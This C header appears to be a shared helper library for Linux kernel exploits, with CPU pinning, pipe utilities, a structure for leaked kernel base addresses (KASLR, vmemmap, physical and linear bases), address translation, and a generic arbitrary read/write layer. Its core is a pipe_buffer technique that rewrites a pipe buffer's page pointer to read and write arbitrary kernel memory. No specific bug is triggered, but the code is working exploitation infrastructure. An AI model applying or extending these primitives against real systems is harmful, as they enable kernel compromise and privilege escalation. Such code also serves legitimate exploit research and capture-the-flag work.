#ifndef EXP_COMMON_H
#define EXP_COMMON_H

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdint.h>
#include <stddef.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <string.h>
#include <assert.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/resource.h>

typedef unsigned char u8;
typedef signed char i8;
typedef unsigned short u16;
typedef signed short i16;
typedef unsigned int u32;
typedef signed int i32;
typedef unsigned long u64;
typedef signed long i64;

typedef size_t usize;
typedef ssize_t isize;

#ifndef EXP_UNUSED
#define EXP_UNUSED __attribute__((unused))
#endif

/////////////////////////////////////////////////
///// Utilities                             /////
/////////////////////////////////////////////////

static EXP_UNUSED __attribute__((noreturn)) void panic(const char *msg) {
    printf("panic: %s\n", msg);
    exit(1);
}

#define LOG(fmt, ...) do {                                 \
    printf(fmt "\n", ##__VA_ARGS__);                       \
    fflush(stdout);                                        \
} while(0)

#define SYSCHK(x) ({                                       \
    __typeof__(x) __res = (x);                             \
    if (__res == (__typeof__(x))-1) {                      \
        LOG("SYSCHK(" #x ") = %lld\n", (long long) __res); \
        int error_val = errno;                             \
        LOG("errno: %d\n", error_val);                     \
        exit(1);                                           \
    }                                                      \
    __res;                                                 \
})

#define CHECK(x, n) ({                                     \
    __typeof__(x) __res = (x);                             \
    if (__res != n) {                                      \
        LOG("SYSCHK(" #x ") = %lld\n", (long long) __res); \
        int error_val = errno;                             \
        LOG("errno: %d\n", error_val);                     \
        exit(1);                                           \
    }                                                      \
    __res;                                                 \
})

static EXP_UNUSED usize align_down(usize n, usize align) {
    return n & ~(align - 1);
}

static EXP_UNUSED usize align_up(usize n, usize align) {
    return align_down(n + align - 1, align);
}

static EXP_UNUSED i32 get_num_cpus() {
    return SYSCHK(sysconf(_SC_NPROCESSORS_ONLN));
}

static EXP_UNUSED void pin_thread_to_cpu(pid_t pid, int cpu) {
    i32 num_cpus = get_num_cpus();
    cpu_set_t *cpu_setp = CPU_ALLOC(num_cpus);
    size_t size = CPU_ALLOC_SIZE(num_cpus);
    CPU_ZERO_S(size, cpu_setp);
    if (cpu >= 0 && cpu < num_cpus) {
        CPU_SET_S(cpu, size, cpu_setp);
    } else {
        for (int i = 0; i < num_cpus; i++) {
            CPU_SET_S(i, size, cpu_setp);
        }
    }

    SYSCHK(sched_setaffinity(pid, size, cpu_setp));
    CPU_FREE(cpu_setp);
}

static EXP_UNUSED void pin_to_cpu(int cpu) {
    pin_thread_to_cpu(0, cpu);
}

/**
 * Adjusts the soft open file limit.
 * * @param new_limit The requested new soft limit.
 * @return 0 on success, -1 on failure.
 */
static EXP_UNUSED int set_soft_file_limit(rlim_t new_limit) {
    struct rlimit rl;

    // Fetch the current limit
    if (getrlimit(RLIMIT_NOFILE, &rl) != 0) {
        fprintf(stderr, "Error getting limit: %s\n", strerror(errno));
        return -1;
    }

    printf("Old Soft Limit: %lu\n", (unsigned long)rl.rlim_cur);

    // Update the soft limit
    rl.rlim_cur = new_limit;

    // Apply the new limit
    if (setrlimit(RLIMIT_NOFILE, &rl) != 0) {
        fprintf(stderr, "Error setting soft limit: %s\n", strerror(errno));
        return -1;
    }

    // Verify and log the new limit
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        printf("New Soft Limit: %lu\n", (unsigned long)rl.rlim_cur);
    }

    return 0;
}

/**
 * Adjusts the hard open file limit.
 * Note: Increasing this requires root/superuser privileges.
 * * @param new_limit The requested new hard limit.
 * @return 0 on success, -1 on failure.
 */
static EXP_UNUSED int set_hard_file_limit(rlim_t new_limit) {
    struct rlimit rl;

    // Fetch the current limit
    if (getrlimit(RLIMIT_NOFILE, &rl) != 0) {
        fprintf(stderr, "Error getting limit: %s\n", strerror(errno));
        return -1;
    }

    printf("Old Hard Limit: %lu\n", (unsigned long)rl.rlim_max);

    // Update the hard limit
    rl.rlim_max = new_limit;

    // Apply the new limit
    if (setrlimit(RLIMIT_NOFILE, &rl) != 0) {
        fprintf(stderr, "Error setting hard limit: %s\n", strerror(errno));
        return -1;
    }

    // Verify and log the new limit
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        printf("New Hard Limit: %lu\n", (unsigned long)rl.rlim_max);
    }

    return 0;
}

/////////////////////////////////////////////////
///// Pipe                                  /////
/////////////////////////////////////////////////

typedef struct {
    int read_fd;
    int write_fd;
} Pipe;

static EXP_UNUSED Pipe open_pipe() {
    int fds[2] = { 0 };
    SYSCHK(pipe(fds));
    Pipe pipe = {
        .read_fd = fds[0],
        .write_fd = fds[1],
    };
    return pipe;
}

static EXP_UNUSED void pipe_close(Pipe *pipe) {
    SYSCHK(close(pipe->read_fd));
    SYSCHK(close(pipe->write_fd));
}

static EXP_UNUSED void pipe_set_buf_size(Pipe *pipe, usize size) {
    CHECK(fcntl(pipe->write_fd, F_SETPIPE_SZ, (int) size), (int) size);
}

static EXP_UNUSED void pipe_prefault(Pipe *pipe) {
    u8 buf = 0;
    SYSCHK(write(pipe->write_fd, &buf, sizeof(buf)));
    CHECK(read(pipe->read_fd, &buf, sizeof(buf)), sizeof(buf));
}

/////////////////////////////////////////////////
///// Address / Leaks                       /////
/////////////////////////////////////////////////

// values in KernelAddrs will be 0 if no leak obtained
typedef struct {
    // virtual base address of kernel mappings which are used during execution
    usize kaslr_base;
    // virtual base address of vmemmap
    usize vmemmap_base;
    // physical address where kernel is loaded at
    usize phys_base;
    // virtual base address of linear mapping
    usize linear_base;
} KernelAddrs;

static EXP_UNUSED usize get_kaslr_base(KernelAddrs *self) {
    assert(self->kaslr_base != 0);
    return self->kaslr_base;
}

static EXP_UNUSED usize get_vmemmap_base(KernelAddrs *self) {
    assert(self->vmemmap_base != 0);
    return self->vmemmap_base;
}

static EXP_UNUSED usize get_phys_base(KernelAddrs *self) {
    assert(self->phys_base != 0);
    return self->phys_base;
}

static EXP_UNUSED usize get_linear_base(KernelAddrs *self) {
    assert(self->linear_base != 0);
    return self->linear_base;
}

static EXP_UNUSED usize addr_to_page(KernelAddrs *self, usize addr) {
    return ((addr >> 12) << 6) + get_vmemmap_base(self);
}

static EXP_UNUSED bool is_in_range(usize addr, usize start, usize end) {
    return addr >= start && addr < end;
}

// these includes define architecture specific things like:
// - is_linear_address, is_kernel_address
// - default values for several regions of kernel memory (vmemmap, kernel, linear mapping)
#if defined(__aarch64__)
#include <common_aarch64.h>
#elif defined(__x86_64__)
#include <common_x86_64.h>
#else
#error "exp_common.h address helpers only support aarch64 and x86_64"
#endif

// used for making physical pipe rw to virtual pipe rw
// reliable enough for most exploits
static EXP_UNUSED usize scuffed_virt_to_phys(KernelAddrs *self, usize virt_addr) {
    if (is_linear_address(virt_addr)) {
        return virt_addr - get_linear_base(self);
    } else if (is_kernel_address(virt_addr)) {
        return virt_addr - get_kaslr_base(self) + get_phys_base(self);
    } else {
        panic("could not translate virtual to physical address");
    }
}

/////////////////////////////////////////////////
///// Arb R/W wrapper                       /////
/////////////////////////////////////////////////

// RwOps may be physical or virtual arbitrary read write
typedef struct RwOps {
    u8 (*read_byte)(struct RwOps *self, usize addr);
    usize (*read_word)(struct RwOps *self, usize addr);
    void (*read)(struct RwOps *self, usize addr, u8 *buf, usize len);
    void (*write_byte)(struct RwOps *self, usize addr, u8 value);
    void (*write_word)(struct RwOps *self, usize addr, usize value);
    void (*write)(struct RwOps *self, usize addr, u8 *buf, usize len);
} RwOps;

static EXP_UNUSED u8 rw_read_byte(RwOps *rw, usize addr) {
    if (rw->read_byte != NULL) {
        return rw->read_byte(rw, addr);
    } else if (rw->read_word != NULL) {
        usize base = align_down(addr, sizeof(usize));
        return (rw->read_word(rw, base) >> ((addr - base) * 8)) & 0xff;
    } else if (rw->read != NULL) {
        u8 out = 0;
        rw->read(rw, addr, &out, sizeof(out));
        return out;
    } else {
        panic("no valid read vtable function");
    }
}

static EXP_UNUSED usize rw_read_word(RwOps *rw, usize addr) {
    if (rw->read_word != NULL) {
        return rw->read_word(rw, addr);
    } else if (rw->read != NULL) {
        usize out = 0;
        rw->read(rw, addr, (u8 *) &out, sizeof(out));
        return out;
    } else if (rw->read_byte != NULL) {
        usize out = 0;
        for (usize i = 0; i < sizeof(out); i++) {
            out |= ((usize) rw->read_byte(rw, addr + i)) << (i * 8);
        }
        return out;
    } else {
        panic("no valid read vtable function");
    }
}

static EXP_UNUSED void rw_read(RwOps *rw, usize addr, u8* buf, usize len) {
    if (rw->read != NULL) {
        rw->read(rw, addr, buf, len);
    } else if (rw->read_word != NULL) {
        usize i = 0;
        while (i < len && ((addr + i) & (sizeof(usize) - 1)) != 0) {
            usize base = align_down(addr + i, sizeof(usize));
            buf[i] = (rw->read_word(rw, base) >> (((addr + i) - base) * 8)) & 0xff;
            i++;
        }
        while (i + sizeof(usize) <= len) {
            usize word = rw->read_word(rw, addr + i);
            memcpy(&buf[i], &word, sizeof(word));
            i += sizeof(usize);
        }
        while (i < len) {
            usize base = align_down(addr + i, sizeof(usize));
            buf[i] = (rw->read_word(rw, base) >> (((addr + i) - base) * 8)) & 0xff;
            i++;
        }
    } else if (rw->read_byte != NULL) {
        for (usize i = 0; i < len; i++) {
            buf[i] = rw->read_byte(rw, addr + i);
        }
    } else {
        panic("no valid read vtable function");
    }
}

static EXP_UNUSED void rw_write_byte(RwOps *rw, usize addr, u8 byte) {
    if (rw->write_byte != NULL) {
        rw->write_byte(rw, addr, byte);
    } else if (rw->write != NULL) {
        rw->write(rw, addr, &byte, sizeof(byte));
    } else if (rw->write_word != NULL) {
        if (rw->read_byte == NULL && rw->read_word == NULL && rw->read == NULL) {
            panic("write_byte via write_word requires a read vtable function");
        }
        usize base = align_down(addr, sizeof(usize));
        usize shift = (addr - base) * 8;
        usize mask = (usize) 0xff << shift;
        usize word = rw_read_word(rw, base);
        word = (word & ~mask) | ((usize) byte << shift);
        rw->write_word(rw, base, word);
    } else {
        panic("no valid write vtable function");
    }
}

static EXP_UNUSED void rw_write_word(RwOps *rw, usize addr, usize word) {
    if (rw->write_word != NULL) {
        rw->write_word(rw, addr, word);
    } else if (rw->write != NULL) {
        rw->write(rw, addr, (u8 *) &word, sizeof(word));
    } else if (rw->write_byte != NULL) {
        for (usize i = 0; i < sizeof(word); i++) {
            rw->write_byte(rw, addr + i, (word >> (i * 8)) & 0xff);
        }
    } else {
        panic("no valid write vtable function");
    }
}

static EXP_UNUSED void rw_write(RwOps *rw, usize addr, u8 *buf, usize len) {
    if (rw->write != NULL) {
        rw->write(rw, addr, buf, len);
    } else if (rw->write_word != NULL) {
        usize i = 0;
        while (i < len && ((addr + i) & (sizeof(usize) - 1)) != 0) {
            rw_write_byte(rw, addr + i, buf[i]);
            i++;
        }
        while (i + sizeof(usize) <= len) {
            usize word = 0;
            memcpy(&word, &buf[i], sizeof(word));
            rw->write_word(rw, addr + i, word);
            i += sizeof(usize);
        }
        while (i < len) {
            rw_write_byte(rw, addr + i, buf[i]);
            i++;
        }
    } else if (rw->write_byte != NULL) {
        for (usize i = 0; i < len; i++) {
            rw->write_byte(rw, addr + i, buf[i]);
        }
    } else {
        panic("no valid write vtable function");
    }
}

// wraps a physical arbitrary rw and turns it into virtual
typedef struct {
    RwOps ops;
    KernelAddrs leaks;
    RwOps *inner;
} RwVirtWrapper;

static EXP_UNUSED u8 rw_virt_wrapper_read_byte(struct RwOps *self_ops, usize virt_addr) {
    RwVirtWrapper *self = (RwVirtWrapper *) self_ops;
    usize phys_addr = scuffed_virt_to_phys(&self->leaks, virt_addr);
    return rw_read_byte(self->inner, phys_addr);
}

static EXP_UNUSED usize rw_virt_wrapper_read_word(struct RwOps *self_ops, usize virt_addr) {
    RwVirtWrapper *self = (RwVirtWrapper *) self_ops;
    usize phys_addr = scuffed_virt_to_phys(&self->leaks, virt_addr);
    return rw_read_word(self->inner, phys_addr);
}

static EXP_UNUSED void rw_virt_wrapper_read(struct RwOps *self_ops, usize virt_addr, u8 *buf, usize len) {
    RwVirtWrapper *self = (RwVirtWrapper *) self_ops;
    usize phys_addr = scuffed_virt_to_phys(&self->leaks, virt_addr);
    rw_read(self->inner, phys_addr, buf, len);
}

static EXP_UNUSED void rw_virt_wrapper_write_byte(struct RwOps *self_ops, usize virt_addr, u8 value) {
    RwVirtWrapper *self = (RwVirtWrapper *) self_ops;
    usize phys_addr = scuffed_virt_to_phys(&self->leaks, virt_addr);
    rw_write_byte(self->inner, phys_addr, value);
}

static EXP_UNUSED void rw_virt_wrapper_write_word(struct RwOps *self_ops, usize virt_addr, usize value) {
    RwVirtWrapper *self = (RwVirtWrapper *) self_ops;
    usize phys_addr = scuffed_virt_to_phys(&self->leaks, virt_addr);
    rw_write_word(self->inner, phys_addr, value);
}

static EXP_UNUSED void rw_virt_wrapper_write(struct RwOps *self_ops, usize virt_addr, u8 *buf, usize len) {
    RwVirtWrapper *self = (RwVirtWrapper *) self_ops;
    usize phys_addr = scuffed_virt_to_phys(&self->leaks, virt_addr);
    rw_write(self->inner, phys_addr, buf, len);
}

static EXP_UNUSED RwVirtWrapper rw_virt_wrapper_new(RwOps *inner, KernelAddrs leaks) {
    bool can_read = inner->read_byte != NULL || inner->read_word != NULL || inner->read != NULL;
    bool can_write = inner->write_byte != NULL || inner->write_word != NULL || inner->write != NULL;

    RwOps ops = {
        .read_byte = can_read ? rw_virt_wrapper_read_byte : NULL,
        .read_word = can_read ? rw_virt_wrapper_read_word : NULL,
        .read = can_read ? rw_virt_wrapper_read : NULL,
        .write_byte = can_write ? rw_virt_wrapper_write_byte : NULL,
        .write_word = can_write ? rw_virt_wrapper_write_word : NULL,
        .write = can_write ? rw_virt_wrapper_write : NULL,
    };

    RwVirtWrapper out = {
        .ops = ops,
        .leaks = leaks,
        .inner = inner,
    };

    return out;
}

struct pipe_buffer_t {
  unsigned long page;
  unsigned int offset, len;
  unsigned long ops;
  unsigned long flag;
  unsigned long private_data;
};

typedef struct {
    RwOps ops;
    KernelAddrs leak;
    Pipe rw_pipe;
    struct pipe_buffer_t orig_pipe_buffer;
    void (*set_pipe_buffer)(void *data, struct pipe_buffer_t *pipe_buffer);
    void *data;
} RwPipeBuffer;

// for now just doing read_word impl
// read could maybe be done, but there are some restrictions about writing only 4095 and such
static EXP_UNUSED usize rw_pipe_buffer_read_word(RwOps *self_ops, usize addr) {
    RwPipeBuffer *self = (RwPipeBuffer *) self_ops;

    // shouldn't ever happen since read_word vtable entry always called with 8 byte aligned
    if ((addr & 0xfff) + 8 > 0x1000) {
        panic("invalid read");
    }

    struct pipe_buffer_t pipe_buffer = self->orig_pipe_buffer;

    pipe_buffer.page = addr_to_page(&self->leak, addr);
    pipe_buffer.len = 9;
    pipe_buffer.offset = addr & 0xfff;

    self->set_pipe_buffer(self->data, &pipe_buffer);

    // now do the read memory
    usize data;
    SYSCHK(read(self->rw_pipe.read_fd, &data, sizeof(data)));
    return data;
}

static EXP_UNUSED void rw_pipe_buffer_write_word(RwOps *self_ops, usize addr, usize value) {
    RwPipeBuffer *self = (RwPipeBuffer *) self_ops;

    // shouldn't ever happen since read_word vtable entry always called with 8 byte aligned
    if ((addr & 0xfff) + 8 > 0x1000) {
        panic("invalid write");
    }

    struct pipe_buffer_t pipe_buffer = self->orig_pipe_buffer;

    pipe_buffer.page = addr_to_page(&self->leak, addr);
    pipe_buffer.len = 0;
    pipe_buffer.offset = addr & 0xfff;

    self->set_pipe_buffer(self->data, &pipe_buffer);

    // now do the write of memory
    SYSCHK(write(self->rw_pipe.write_fd, &value, sizeof(value)));
}

static EXP_UNUSED RwPipeBuffer rw_pipe_buffer_new(
    KernelAddrs leak,
    Pipe rw_pipe,
    struct pipe_buffer_t *orig_pipe_buffer,
    void (*set_pipe_buffer)(void *data, struct pipe_buffer_t *pipe_buffer),
    void *data
) {
    RwOps ops = {
        .read_word = rw_pipe_buffer_read_word,
        .write_word = rw_pipe_buffer_write_word,
    };

    RwPipeBuffer out = {
        .ops = ops,
        .leak = leak,
        .rw_pipe = rw_pipe,
        .orig_pipe_buffer = *orig_pipe_buffer,
        .set_pipe_buffer = set_pipe_buffer,
        .data = data,
    };

    return out;
}


#endif
